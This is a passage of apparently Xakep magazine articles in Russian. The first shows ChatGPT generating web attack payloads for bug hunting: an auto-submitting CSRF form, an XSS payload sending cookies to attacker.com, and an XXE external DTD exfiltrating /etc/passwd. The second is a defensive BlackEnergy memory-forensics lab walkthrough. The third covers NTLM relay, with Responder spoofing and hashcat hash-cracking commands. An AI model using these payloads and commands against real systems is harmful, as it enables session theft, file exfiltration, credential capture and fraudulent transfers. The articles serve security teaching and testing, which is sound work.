Однако в дан ном слу чае таких заголовков нет, и это может озна чать, что при-
ложение не защище но от атак перехвата тра фика (man in the middle).


Об ращение к ней ронке за помощью с заголовками поз воля ет очень быс тро
под светить мисконфиги и предположить потен циальные векторы атаки.
  Из плюсов: она может предположить направле ния атаки на при ложе ние
и под ска зать конкрет ные варианты обхода текущих ограничений, в частнос ти
это будет полезно для обхода CSP.


ÝÊÑÏËÓÀÒÀÖÈß

CSRF
CSRF (cross-site request forgery) — уязвимость, при которой зло умышленник
может заставить пользователя выполнить нежела тель ные действия на сай те,
где пользователь аутентифицирован. Для этого создается вредоносный зап-
рос, исполне ние которого приводит к совершению дей ствия от име ни поль-
зователя без его ведома.
   Если про ще, злоумыш ленник создает на своем сай те скрипт, который
выполняет зап рос на адрес вроде такого:


www.victim_bank.com/transfer_all_money?toAccount=1337

Когда жертва посетит страницу с этим скриптом, он выполнится в браузе ре,
возьмет куки и выполнит запрос на указан ный адрес. В результате атаки все
деньги со сче та жер твы будут переведены на ука занный аккаунт.



Çàïðîñ
У меня есть HTTP-зап рос, сгенерируй CSRF PoC для него.


 POST http://victim_bank.com/transfer_all_money HTTP/1.1
 Host: victim_bank.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (
 KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537
 x-browser: Chrome
 Referer: victim_bank.com
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 14


 toAccount=1337





Îòâåò
POC-code для пре дос тавленного запроса:


    <html>
   <head>
     <title>CSRF PoC</title>
   </head>
 <body>
  <h1>CSRF PoC</h1>
  <form action="http://victim_bank.com/transfer_all_money" method=
 "POST" id="csrf-form">
   <input type="hidden" name="toAccount" value="1337">
  </form>
  <script>
   // Submit the form as soon as the page loads
   document.addEventListener("DOMContentLoaded", function() {
   document.getElementById("csrf-form").submit();
   });
  </script>
 </body>
 </html>




Давай подумаем, как ChatGPT может быть здесь нам полезен. Я вижу такие
вари анты:
 1. Соз дание proof of concept (PoC) для демонстрации CSRF-уяз вимости: ты
  можешь пре дос тавить информацию о зап росе или фор ме, и ChatGPT соз-
   даст HTML-страницу или код на JavaScript, который будет генерировать
   поддельный запрос, имитиру ющий дей ствие пользователя.
 2. Объясне ние и предложение решений: ChatGPT может предоставить
   детальное объясне ние того, как работа ет CSRF-уязвимость, и предложить
   способы обнаружения и предот вращения таких уязвимостей на сервере.
   Это может вклю чать рекомен дации по использованию CSRF-токенов, про-
   верке HTTP-заголов ков и дру гим методам защиты.
 3. Помощь в идентификации потен циальных уязвимых мест: ИИ найдет учас-
   тки кода или функции веб-при ложе ния, которые могут быть уязвимыми
   перед CSRF-атаками, а также укажет на методы тестирования и обнаруже-
   ния таких уязвимос тей.


XSS
XSS (cross-site scripting) — уязвимость, позволя ющая злоумышленни ку внед-
рить вредоносный код (обычно JavaScript) на веб-страницу, которую прос-
матри вают другие пользователи. Так зло умыш ленник может получить дос туп
к конфиденциальной информации, нап ример куки, или выполнить произволь-
ные дей ствия от име ни пользователя без его ведома.
  Воз можные вари анты при менения ChatGPT:
 1. Соз дание PoC для демонс трации XSS-уязвимости. Ты можешь пре дос-
   тавить информацию о месте, где обнаруже на уязвимость, и ChatGPT соз-
   даст при мер вредонос ного кода на JavaScript, который будет ее эксплу-
   ати ровать.
 2. Соз дание вре донос ной нагрузки, реализующей заложенный алгоритм
   для получения требуемого импакта от экс плуатации уязвимости.

Нап ример,  нам  нуж но,  чтобы  в  результате  эксплу атации  уязвимости
и исполне ния нашей наг рузки куки пользователя отправ лялись на под кон-
трольный нам сервер. ChatGPT с радостью сгенери рует нам такую нагрузку.



Çàïðîñ
У меня есть Reected XSS по такому адресу:


 server.com/?...original_path=javascript%3aalert(1)%2f%2frb0iabdd


Сделай  так, чтобы результатом ее эксплуата ции была отправ ка cookie
посетителя на адрес attacker.com.




Îòâåò
В качестве значения параметра original_path подставьте сле дующую фун-
кцию:


 javascript: (function() {
   var xhr = new XMLHttpRequest();
   xhr.open('GET', 'https://attacker.com/collect?cookie=' +
 encodeURIComponent(document.cookie), true);
   xhr.send();
 })();





XXE
XXE (XML external entity) — это уяз вимость, которая воз ника ет при обра ботке
документов XML с подклю ченными внеш ними ресурсами. Если сер вер неп-
равильно обрабаты вает такие сущности  (entities), злоумыш ленник может
использовать XXE-уязвимости для чтения локальных фай лов, сканирования
внутренних систем, выполнения зап росов к внутренним сервисам или про-
веде ния DoS-атак.
  Ней росеть поможет с XXE следующим обра зом:
 1. ChatGPT может составить наг рузки для эксплу ата ции XXE, соз давая раз-
  ные варианты XML-документов и DTD-фай лов. Нам же останется только
   протестировать их на механизмах защиты уязвимого.
 2. ИИ может под робно рассказать, как работает XXE-уяз вимость, и пред-
   ложить способы обна ружения и предот вра щения  таких  уязвимос тей
   на сервере.

При веду пример.



Çàïðîñ
У меня есть следующая струк тура файла:


 <?xml version="1.0" encoding="UTF-8"?>
 <users>
     <user>
         <username>aaaaaaaaaaaaaa</username>
         <email>bbbbbbbbbbbbbbb</email>
     </user>
 </users>


Я знаю, что здесь есть XXE-уязвимость. Однако для эксплуатации мне необ-
ходимо под ключить DTD-файл, расположен ный на моем сервере. Сгенерируй
наг рузку и DTD-файл, позволяющий выпол нить чтение локаль ного файла
/etc/passwd.




Îòâåò
Для эксплуатации XXE-уяз вимости и подклю чения внешнего DTD-фай ла
с вашего сервера вы можете использовать следующую нагрузку:


 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE users SYSTEM "http://your-server-url/your-dtd-file.dtd">
 <users>
     <user>
         <username>aaaaaaaaaaaaaa</username>
         <email>bbbbbbbbbbbbbbb</email>
     </user>
 </users>


Что бы прочитать локальный файл /etc/passwd с использовани ем XXE-уяз-
вимос ти и внешнего DTD-файла, соз дай те следующий DTD-файл:


 <!ENTITY % data SYSTEM "file:///etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://your-server-url/
 collect?data=%data;'>">
 %param1;





Äåîáôóñêàöèÿ è àíàëèç êîäà
Ис поль зовать ней росеть можно и для авто мати ческого анализа кода — чтобы
про верить программу на уязвимости. ChatGPT про информирует о потен-
циальных слабых местах и проб лемах безопас ности. Например, скорми ней-
росети исходный код несколь ких взаимос вязанных сервисов, и она постара-
ется указать на SQL-инъекции, CRLF, cross-site scripting, SSTI и многие другие
воз можные проблемы.
  Еще нейросеть будет полезна для деоб фускации. Обфусци рованный код
сей час мож но встре тить в любом мобильном или веб-приложении. Обыч но
это затрудняет анализ прог раммы, но нейросеть может рас путать всё, что
люди запута ли.
  Сейчас ChatGPT умеет раз ворачивать обфусцированный код в обычный
исходник только в самых прос тых случаях, но даже в сложных она серьезно
помогает реконструиро вать код и зна чительно повысить понятность алгорит-
ма.
  Попробуем на практике.



Çàïðîñ
Де обфусцируй код на JS:


 x='',X=!x+x,xx=!X+x,xX=x+{},Xx=X[x++],XX=X[Xxx=x],
 XxX=++Xxx+x,xxx=xX[Xxx+XxX],
 X[xxx+=xX[x]+(X.xx+xX)[x]+xx[XxX]+Xx+XX+X[Xxx]+
 xxx+Xx+xX[x]+XX][xxx](xx[x]+xx[Xxx]+X[XxX]+XX+Xx+"(x)")()





Ôðàãìåíò îòâå òà

 const emptyString = '';
 const _true = 'true';
 const _false = 'false';
 const objectString = '[object Object]';
 const t = 't';
 const r = 'r';
 const c = 'c';
 const constructorString = 'constructor';
 const alertFunction = Function('alert(x)');
 alertFunction();


Итак, данный код создает и выполняет функцию, которая вызывает alert(x),
где x — пустая строка.



ÑÎÑÒÀÂËÅÍÈÅ ÎÒ×ÅÒÀ

Нельзя забывать, что, кроме тех ничес кой части, ChatGPT позволя ет авто-
мати зировать самую рутин ную часть любого исследования — написание
отче та.
  Дос таточно ука зать, какой тип уязвимости, в каком параметре и на каком
URL был выяв лен, что бы получить пол ное, деталь ное описание уязвимости
и рекомендации, как ее испра вить.



Çàïðîñ
Я обнаружил Reected XSS в панели адми нистрирования сайта по такому
адресу:


 https://website.com/admin/path?parameter=<script>alert(1)</script>


Напиши отчет для баг баунти-прог раммы по этой уязвимости.




Îòâåò
Краткое опи сание: я обна ружил уяз вимость отра женного кросс-сай тового
скрип тинга (XSS) в панели админис тратора сай та (...). Эта уязвимость поз-
воля ет злоумышленнику внедрять вредоносные скрип ты, что может привес ти
к раскрытию конфиден циальной информа ции или несанкциони рованным
дей ствиям от имени жертв.
  Шаги для вос про изведения: (...)
  Воз действие: уязвимость XSS поз воляет злоумышленнику выполнять про-
извольный JavaScript-код в контексте браузера жер твы, что потенциально
может при вести к раскрытию конфиденциаль ной информа ции (например,
сессионных кук, токенов CSRF) или несан кци они рованным действиям от име-
ни жертвы (нап ример, изменение пользователь ских данных или нас троек).
  Ре комен дации: для устранения этой уяз вимос ти рекомендуется кор ректно
про верять входные данные и кодировать вывод данных, предос тавленных
поль зовате лем, осо бенно в параметрах URL. Кро ме того, рассмотрите воз-
можность при мене ния политик безопасности содер жимого (CSP) для пре-
дотвращения выполнения неавторизованных скриптов.
  Ссылки:
 1. CWE-79: Неп равильное обезвреживание вво да при генерации веб-стра-
  ницы «Кросс-сай товый скриптинг»
 2. Стандарт верифи кации безопасности приложений OWASP (ASVS) 3.1:
  Провер ка ввода




ÂÛÂÎÄÛ

В течение несколь ких недель я активно багхантил и упрощал свою деятель-
ность с помощью ChatGPT. За этот период на просторах интерне та появи лись
новые наработки: по интеграции ChatGPT с Burp Suite, Nessus и другими инс-
трументами нас тупательной безопас ности.
  Думаю, большие язы ковые модели скоро будут при меняться повсеместно,
включая, конечно же, сферы ИТ и ИБ. Да, зачастую нейросеть не дает пол ный,
корректный и под робный ответ с первого раза и лишь отве чает общими фра-
зами. Это тре бует от ауди тора определенных знаний, к тому же нужно быть
готовым применять и дру гие инс тру менты, причем иног да креативно (с чем
у ИИ пока проблемы). Тем не менее стать мамкиным кулхацкером с таким
помощником будет проще, чем когда-либо. © X
ВЗЛОМ





   ИЩЕМ НЕИЗВЕСТНЫЙ
       ВРЕДОНОС
   И ВОССТАНАВЛИВАЕМ
    ДАННЫЕ ИЗ ПАМЯТИ




Нередко зло умышленни ки атакуют компь-
ютеры с использовани ем неус тановленных
вре донос ных программ, и все, что остается
после такого инцидента  у специалистов
по кибер безопас ности, — дамп памяти             rayhunt454                                                                                       grigadan454@gmail.com
ском про метирован ной  машины.  Нужно
извлечь  оттуда файл  вредоно са,  иден-
тифици ровать его и восста новить хроноло-
гию ата ки.


В этой статье мы проведем расследова ние подоб ного инцидента на примере
лабора торной работы BlackEnergy с ресурса CyberDefenders. Мы научимся
извле кать основные артефакты из обра за опе ративной памяти Windows
и вос становим процесс атаки.
   Согласно  сце нарию,  круп ная  корпорация  подверглась  кибератаке,
которая при вела к краже конфиденциальных данных. Ата ка была проведена
с использованием ранее не встречавшейся разновид ности вре доноса Black-
Energy v2. Груп па реаги рова ния на инциден ты сде лала дамп памяти скомпро-
метированного компьютера для дальнейше го изучения. Наша задача — про-
вести рассле дование и разоб рать ся, что все-таки произошло.
   По результатам решения кей са необ ходимо отве тить на ряд вопросов,
но я покажу толь ко само решение. Ты смо жешь повторить весь процесс
самос тоятельно, что бы лучше разоб рать ся и закрепить матери ал.
   Для начала загрузим файл архива с арте фактами и приступим к его иссле-
дованию.
   Для анализа памяти вос пользуемся утилитой Volatility Framework 2.6.1 —
этот инструмент написан на Python версии 2 и предназна чен для извле чения
артефактов из образцов энергозависимой памяти.


ÈÑÏÎËÜÇÓÅÌÛÅ ÏËÀÃÈÍÛ VOLATILITY2 ÄËß ÈÇÂËÅ×ÅÍÈß
ÄÀÍÍÛÕ
 1. Imageinfo — плагин для определения опе раци онной сис темы, пакета
   обновле ний и аппаратной архи тектуры исследуемо го обра за.
 2. Pstree — плагин для просмотра списка процес сов в виде дерева.
 3. Handles — пла гин для прос мотра откры тых дес крипторов к файлам, раз-
   делам реестра, мьютексам, именованным каналам, событиям в процес-
    сах. Также можно отоб разить дек срип торы для конкретного процесса
   или отфильтро вав их по конкрет ному типу объекта.
 4. Consoles — плагин для поиска команд, которые злоумышленники ввели
   в cmd.exe. Основным преимуществом это го пла гина явля ется то, что он
   не толь ко выводит команды, введенные злоумышленниками, но и собирает
   весь экранный буфер (ввод и вывод).
 5. Memdump — плагин для извлечения всех резидентных страниц памяти
   в процессе.
 6. Filescan —  плагин  для  поиска объектов FILE_OBJECT  в  памяти
   с помощью сканиро вания тегов пула. Данный пла гин найдет все откры тые
   фай лы.
 7. Dumpfiles — плагин для извлечения кеширован ных файлов из образа
   памяти.
 8. Printkey — плагин для поиска значений в указанном разделе реес тра
   Windows.
 9. Userassist — плагин для получения информации из ключа реес тра
    UserAssist.
10. Mftparser — этот плагин сканирует записи главной таблицы файлов
   (MFT) в памяти и выводит информа цию о вре менных метках фай лов.
11. Malfind — плагин для поиска скры того или внед ренно го в память процес-
   сов кода.
12. Timeliner — плагин для создания временной шкалы событий операци-
   онной системы из различных артефактов памяти.
13. Ldrmodules — плагин для поиска нес вязанных биб лиотек.


ÈÑÑËÅÄÎÂÀÍÈÅ ÎÁÐÀÇÀ ÏÀÌßÒÈ
Прежде чем анализировать артефакты в оперативной памяти, получим про-
филь опе рационной системы, а также первичную информа цию о компь ютере.
Для этого исполь зуется следующая команда:


python2.7 vol.py -f CYBERDEF-567078-20230213-171333.raw imageinfo

Профиль для Volatility2 исследуемой машины — WinXPSP2x86. Получим
первичную информацию о системе, имя компьютера и сетевой адрес.
Для этого восполь зуем ся плагином Printkey, с помощью которого выведем
данные из клю чей реес тра.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 printkey -K  'ControlSet001\Control\
ComputerName\ActiveComputerName'





                      Имя компь ютера

Имя компьютера  исследуемой  системы — CYBERDEF-567078. Получим
сетевой адрес, для это го необходимо определить идентификаторы сетевых
интерфейсов.


python2.7 vol.py  -f /mnt/c/Users/DonNod/Downloads/c79-BE/CYBERDEF-
567078-20230213-171333.raw --profile=WinXPSP2x86 printkey -K
'ControlSet001\Services\Tcpip\Parameters\Interfaces'





               Идентификаторы сетевых интерфейсов

Те перь проверим каж дый сетевой интерфейс и получим сетевые нас трой ки
машины.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 printkey -K  'ControlSet001\Services\Tcpip\
Parameters\Interfaces\{B35F0A5F-EBC3-4B5D-800D-7C1B64B30F14}'





                      IP-адрес сетевого интерфейса

Сетевой адрес иссле дуемой машины 192.168.8.195 выдан динамически
DHCP-сервером 192.168.8.1.
   Приступим к поис ку вредонос ной активности. Начнем с анализа процес-
сов, для это го вос пользуемся пла гинами pstree и pslist. Вывод работы пла-
гинов сох раним в файлы для удобства дальнейше го исследования.


python2.7 vol.py  -f  c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 pslist >  pslist.txt





                  Список запущенных процес сов

Анализируя вывод плагина pslist, можно заметить, что на момент снятия обра-
за памяти в системе работало 19 про цессов. В столбце Exit указано время
завершения процессов, 6 процессов завершили свою работу.
   Проанализируем процес сы с помощью плагина pstree.


python2.7 vol.py  -f  c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 pstree >  pstree.txt





                    Вы вод плагина pstree

Анализируя дерево про цес сов, мож но заметить процесс с инте ресным име-
нем rootkit.exe (идентифика тор 964), а также процесс cmd.exe (иден-
тификатор 1960), который явля ется дочерним.
   Те перь следует получить дамп данных процес сов и поис кать в них инте-
ресные строки, для это го можно вос пользоваться пла гином memdump.
В нашем случае поиск не дает резуль татов. Попробуем выгрузить исполня-
емый файл вредоносной программы из кеша.
   Получим спи сок файлов в памяти, для это го воспользуемся плагином les-
can, сох раним вывод в файл filescan.txt для дальнейшего поиска фай лов.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 filescan > c79-BE/filescan.txt

По иск исполняемо го фай ла rootkit.exe в списке файлов не дал резуль-
татов. Попробуем постро ить временную шка лу событий операционной сис-
темы и вос становим дей ствия пользователя. Для этого вос пользуемся пла-
гином timeliner, вывод работы плагина сох раним в файл timeline.txt.


python2.7 vol.py  -fc79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 timeliner > c79-BE/timeline.txt

Для удобства анализа загрузим файл событий в Excel. Откро ем программу
MS Oﬃce Excel, перейдем на вкладку «Данные → Из текстового файла»
и выберем файл timeline.txt. Далее отсортируем данные по дате и прис-
тупим к анализу.





                    Времен ная шкала событий

13.02.2023 в 18:25:26 (UTC) созданы процессы rootkit.exe (идентификатор
964) и cmd.exe (идентификатор 1960). Попробуем выяснить, кто запустил
файл rootkit.exe. Для это го проана лизируем ключ UserAssist реестра
Windows. Данный ключ предназна чен для отслеживания выполняемых прог-
рамм. Информация пред ставлена в двоичных значениях и содержит данные
о приложе ниях, запущенных определен ным пользователем из проводника
Windows.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 userassist





                   Вы вод плагина UserAssist

Поль зователь CyberDefenders запустил файл rootkit.exe. Продол жим ана-
лизи ровать временную шкалу событий.
   После запуска файла rootkit.exe в системе была создана служба HVK-
LZDZ. Най дем параметры службы, для это го выведем содержимое ключа
реестра, исполь зуя плагин printkey.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 printkey -K 'CONTROLSET001\SERVICES\HVKLKZDZ'





                  Параметры служ бы HVKLKZDZ

Служба HVKLKZDZ запускает файл драйвера suzmkbtuoyeki.sys. Выгрузим
этот файл и най дем его виртуальный адрес в фай ле filescan.txt, который
был получен из вывода плагина lescan.


                      Адрес фай ла драйвера

С помощью плагина dumples выг рузим файл suzmkbtuoyeki.sys, ука жем
в качес тве параметра его адрес в памяти.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 dumpfiles -Q 0x000000000994af90 -D c79-BE/

MD5-сум ма извле чен ного фай ла — 3f35ed5fe80e2c1bf90af5ff3b6688ea,
про верка на VirusTotal показала, что файл — вредонос.
   Получим дату соз дания это го фай ла, для чего воспользуем ся плагином
mftparser.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 mftparser > c79-BE/mftparser



                 Дата создания файла драйвера

В 18:25:26 (UTC) создан файл драй вера suzmkbtuoyeki.sys.
   Продолжаем анализировать про цессы с помощью плагина malnd. Этот
плагин помогает в поиске внедренного кода в процес сах на осно ве анализа
VAD-структур и прав дос тупа к странице.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 malfind > c79-BE/malfind.txt





                    Вывод плагина malnd

В сег менте памяти по адре су 0x980000 про цесса svchost.exe (идентифика-
тор 880) обнаружен исполняемый код, о чем сви детельству ет сигнатура MZ.
В этот процесс внедрена DLL-биб лиотека. Найдем ее.
   Попробуем найти файлы, открытые в ука занном про цессе, для чего вос-
поль зуемся плагином handles.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 handles -t FILE -p 880 > c79-BE/handles_file.
txt





              Фай ловый хендл процесса svchost.exe

Анализ хендлов исполня емого файла показывает, что вре донос обращался
к фай лу драй вера C:\WINDOWS\system32\drivers\str.sys. Поиск файла
str.sys в списке файлов не дал резуль татов.
   Получим дамп внед ренного учас тка кода с сиг натурой MZ и просканируем
анти вирусными средства ми. Для это го воспользуемся плагином malnd
с аргументом -D.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 malfind -p 880 -D c79-BE/

MD5-сум ма внедренной DLL-биб лиотеки — 20020a9d850bd496954d8c21d-
fa614be, по информации на VirusTotal этот модуль отно сится к семейству вре-
доносов Rootkit.BlackEnergy.
   Продолжаем искать путь к внедренному DLL-файлу. Но для начала раз-
берем ся в методе детек тирова ния удален ного внедрения DLL-биб лиотеки
в процесс.
   Струк тура PEB содержит сведения о процессе. В данной структуре есть
указатель _PEB_LDR_DATA, содержащий сведения о загруженных модулях
для процесса.





                       Структура _PEB_LDR_DATA

Структура _PEB_LDR_DATA имеет  указатели на  три  двусвязных списка,
в которых хранит ся информация о заг руженных DLL для этого про цесса.
 • InLoadOrderModuleList — этот список отслеживает DLL в зависимости
   от порядка их загрузки в память процесса. Исполня емый файл процес са
   заг ружается первым при загрузке процесса, чаще все го это пер вая
   запись.
 • InMemoryOrderModuleList — опре деляет порядок, в котором модули
   появ ляют ся в виртуальной памяти про цес са.
 • InInitializationOrderModuleList  —   не   включает   запись
   для исполняемого фай ла процес са  (.exe), который обыч но доступен
   в остальных списках. Причина кроется в том, что InInitialization
   Order отсле живает DLL на основе фун кции dllmain. Пос кольку исполня-
   емый файл про цес са не имеет функции dllmain, он загружа ется не так,
   как обычная DLL.

Плагин dlllist работа ет только с LoadOrderList. Проблема в том, что иног да
вре донос ные библиотеки могут быть отклю чены от это го списка, чтобы
скрыть свое присутс твие. Это также повлияет на вывод пла гина dlllist, пос-
кольку информация о несвязанных биб лиоте ках не будет отоб ражаться.
В этом случае на помощь приходит плагин ldrmodules, так как он выводит
информацию из всех трех списков и пре доставля ет данные о наличии биб-
лиотеки в каждом из них.


python2.7 vol.py  -f c79-BE/CYBERDEF-567078-20230213-171333.raw
--profile=WinXPSP2x86 ldrmodules -p 880



                  Вывод плагина ldrmodules

Анализируя вывод плагина ldrmodules, мож но заметить имя DLL-файла msxm-
l3r.dll, который имеет значение False во всех трех спис ках. Вредоносный
код отвя зывает внедренную библиотеку от спис ка _LDR_DATA_TABLE_ENTRY
с целью ее сокрытия.
   На этом этапе мы вос становили картину взло ма информационного ресур-
са орга низации. Поль зователь CyberDefenders 13.02.2023 в 18:25:36 запус-
тил файл rootkit.exe, который соз дал службу HVKLZDZ для запуска файла
драйвера suzmkbtuoyeki.sys. Далее служба успешно запустилась, и в про-
цесс svchost.exe (идентификатор 880) была внедрена динамическая биб-
лиотека msxml3r.dll, которая является основной нагрузкой вредоноса
BlackEnergy.
   Анализи руя вре мен ную шка лу событий пос ле запус ка фай ла rootkit.exe,
мы обнаружи ли открытие файлов Key.txt и flag.txt.txt. Восстановим их
содержимое.



                    Времен ная шкала событий

В 18:28:25 (UTC) поль зователь открыл файл Key.txt и почти сразу следом —
flag.txt.txt. Вос становим эти файлы с помощью плагина dumples и рас-
шифруем содержимое фай ла flag.txt.txt.




                 Содержимое фай ла ag.txt.txt


                  Со держимое файла Key.txt

Для написания алгорит ма рас шифровки воспользуемся сервисом CyberChef.
Криптографический алго ритм рас шифровки — AES-256 в режиме ECB, ключ
указан в файле Key.txt.





                    Алгоритм расшифровки файла


ÂÛÂÎÄÛ
Мы попрактиковались в исследовании образа оперативной памяти, вос ста-
нови ли вре менную шкалу событий и научились детектировать удаленное
внедрение DLL-библиотеки в процесс. Также мы обнаружили вредонос ную
программу и вос станови ли файлы из обра за памяти. Подобный метод атаки
часто исполь зуется зло умышленниками, поэтому описанные в этой статье
при емы применяются на прак тике при расследова нии киберинцидентов. © X
ВЗЛОМ





           ЗАХВАТЫВАЕМ
       NTLM-АУТЕНТИФИКАЦИЮ
          ДЛЯ RELAY-АТАКИ





По чему мы до сих пор встречаем NTLM-
аутентификацию  во многих  инфраструк-
турах?  Потому  что  Windows  не  может
существо вать без нее. Но у NTLM-аутен-
тифика ции  есть  целый  ряд  проблем,               DrieVlad                                                                                               vlad.driev@gmail.com
которыми  поль зуются  зло умыш ленники.
Одна из них — это воз можность Relay-атак.
В этой статье мы обсудим спо собы захвата
аутентификации для про веде ния Relay-ата-
ки.


ÒÅÎÐÈß

NTLM — это протокол про верки подлиннос ти в сетях Windows NT. На самом
деле он переко чевал и в дру гие домены, нап ример ALD или FreeIPA. Чтобы
не закапы ваться глубоко в теорию, постараюсь объ яснить принцип его
работы на прос той схе ме.





                   Схема NTLM-аутентификации

 1. Клиент ини циирует процесс прохождения аутен тификации специальным
   сообщени ем.
 2. Сер вер отправляет некото рое слу чайное значение кли енту.
 3. Клиент шиф рует  слу чайное значение своим секретом и отправляет
   на про верку серверу.

В прос том случае все понятно: есть клиент, есть сервер, клиент про ходит
аутентификацию по протоколу NTLM. Добавим остроты в нашу схе му: теперь
у нас появляется некий ата кующий.





                        Схе ма NTLM Relay

Из схе мы мы понимаем, что ата кующий на своей рабочей станции сразу раз-
ворачивает и сервер, и клиент для вза имо действия по протоко лу NTLM.
Для улучшения восприятия пояс ним, что про исходит на схеме.
 1. Клиент (жертва) отправляет сообщение о начале NTLM-аутентифика ции —
   NEGOTIATE. Атакующий перехватывает это сооб щение с помощью своего
   сервера.
 2. Атакующий отправ ляет со своего клиента сооб щение о начале NTLM-
   аутентификации — NEGOTIATE на целевой сер вер.
 3. С целевого сервера атакующему приходит сообщение со случайным зна-
   чением — CHALLENGE.
 4. Атакующий отправ ляет сообщение с таким же CHALLENGE, как на третьем
   шаге, жертве.
 5. Жертва шифрует CHALLENGE своим NTLM-хешем и отправляет сер веру.
 6. Атакующий перех ватывает ответ жер твы и пересылает его серверу. Ата-
  кующий успешно про ходит аутентификацию на целевом сервере.

Схе ма  в целом  понятна, но при проведе нии  атаки быва ют нюансы,
про которые нуж но знать. Во-первых, NTLM не существу ет в вакууме, ее
используют различные протоколы, такие как SMB, LDAP или RPC. Во-вто рых,
при про хождении аутентификации могут использоваться разные хеши: Net-
NTLMv1 и NetNTLMv2. Эти хеши име ют свои особенности, от которых может
зависеть результат проведения ата ки.
  Существует две версии протокола: NTLMv1 и NTLMv2. В NTLMv1 исполь-
зует ся хеш NetNTLMv1, и он безнадежно уста рел:
 • Из случайностей там только CHALLENGE, который при сыла ет сервер. Зна-
   чит, при подделке сервера можно подделать и CHALLENGE и, соот ветс-
   твенно, под готовить радужные таб лицы.
 • Также существуют методы восста новления из хеша NetNTLMv1 хеша NT.
  Подробнее об этом можно почитать на сайте Crack.SH.
 • Отсутствует проверка целостности сообщения (MIC — message integrity
   code), которая защища ет от Relay-атак с одного протокола на другой.

Как можно догадаться, в NTLMv2 используется хеш NetNTLMv2. В нем раз-
работ чики пос тарались решить все проб лемы протокола NTLMv1. Действи-
тель но, можно сказать, что обратить этот хеш за разум ное время хотя бы
до NT пока не представляется воз можным. Подготовить радужные таб лицы
не получится, потому что к CHALLENGE добави лась мет ка времени. А вот
с Relay-атаками не все так однозначно, но об этом мы поговорим в другой
раз.
  В этой статье будут рассмотрены некото рые варианты захвата NTLM-
аутентификации для реализации Relay-атак. В следующей мы обсудим непос-
редственно Relay-ата ки.
  Самое прос тое, что мож но сде лать с полученным NetNTLM-хешем любой
версии, — это подобрать пароль по сло варю. Например, так:


hashcat -a0 -m 5500 hash wordlist -r rules (NetNTLMv1)
hashcat -a0 -m 5600 hash wordlist -r rules (NetNTLMv2)


ÇÀÕÂÀÒ Ñ RESPONDER

Один из самых простых способов получить NTLM-аутентификацию — спу финг
с помощью Responder (этот инструмент мож но найти в Kali).




                  Мож но запустить NetBIOS spoong с помощью
                       Responder   и   полученную   аутентификацию
                       использовать для Relay-ата ки. Для этого нужно
                      просто отключить в конфиге сервера Responder
                    SMB, HTTP и DCE RPC, что бы не возникло кон-
                     флик та с ntlmrelayx. После этого запустить Re-
                        sponder и ntlmrelayx.


Уверен, что многие уже использовали этот инс трумент для захвата хешей,
поэтому крат ко про бежимся по основным функци ям. Responder предоставля-
ет пользователю набор серверов для зах вата и обработки аутентификаций.





                   Список серверов Responder

Зах ват хеша с Responder выг лядит при мерно сле дующим образом.





              Захват NetNTLM-хеша с помощью Responder

Этот фор мат пригоден для брута с помощью hashcat. Все зах ваченные хеши
Responder складывает в базу SQLite, расположен ную по пути /usr/share/
responder/Responder.db. Открыть базу мож но сле дующей командой:


sqlitebrowser /usr/share/responder/Responder.db





                  Внеш ний вид Responder.db

Файл кон фигурации Responder находится здесь: /etc/responder/Respon-
der.conf. Эта информа ция может пригодиться, если надо будет выключить
или вклю чить опре деленный сервер. На скрине ниже изображен файл кон-
фигураций Responder.conf.





                      Кон фиг Responder.conf

Responder незаме ним для реали зации спу финг-атак в сетях на основе Win-
dows. Предпосылкой для выполнения атаки типа NetBIOS Spoong служит
наличие в сети широко вещатель ного трафика типа NBNS, LLMNR и mDNS.
Трафик в сети мож но прослушивать с помощью Wireshark, применяя фильтр
NBNS.





                       NBNS-трафик в сети

Вместо визуального анализа тра фика можем просто запустить Responder
в режиме анализа следующей командой:


responder -I eth0 -A

Пос ле запуска получаем при мерно такую картину, можем пробовать спу финг.





                     Responder в режиме ана лиза

Спуфинг-ата ки для захвата аутентификации можно выполнять сле дующей
коман дой:


responder -I eth0 -dwF

Ес ли атака удалась, перехо дим к следующим шагам.





                Ре зультат выполнения спу финг-атаки


ÇÀÕÂÀÒ NTLM-ÀÓÒÅÍÒÈÔÈÊÀÖÈÈ ÄËß RELAY-ÀÒÀÊ

Для выполнения Relay-атак удоб нее всего исполь зовать ntlmrelayx из пакета
impacket. В этом инс трументе реали зованы часто встречающиеся про токолы,
с которых можно захватить NTLM-аутентифика цию. Вооб ще, ntlmrelayx име ет
клиент-сер верную модель, и в этой статье мы как раз обсудим все Relay-
Servers, реали зован ные в нем, и даже добавим новый, которо го еще нет
в основной вет ке.




                      Стоит сразу отметить, что пор ты, которые прос-
                      лушивают серверы RelayServer ntlmrelayx, мож но
                     сменить. Это может пригодить ся при реализации
                      сложных атак.



SMB (445/TCP)

Протокол SMB с точки зрения Relay-атак наиболее изученный и популярный,
поэтому и спо собов захвата аутентификации с SMB боль ше всего. Вот нес-
колько вари антов того, как это мож но сде лать:
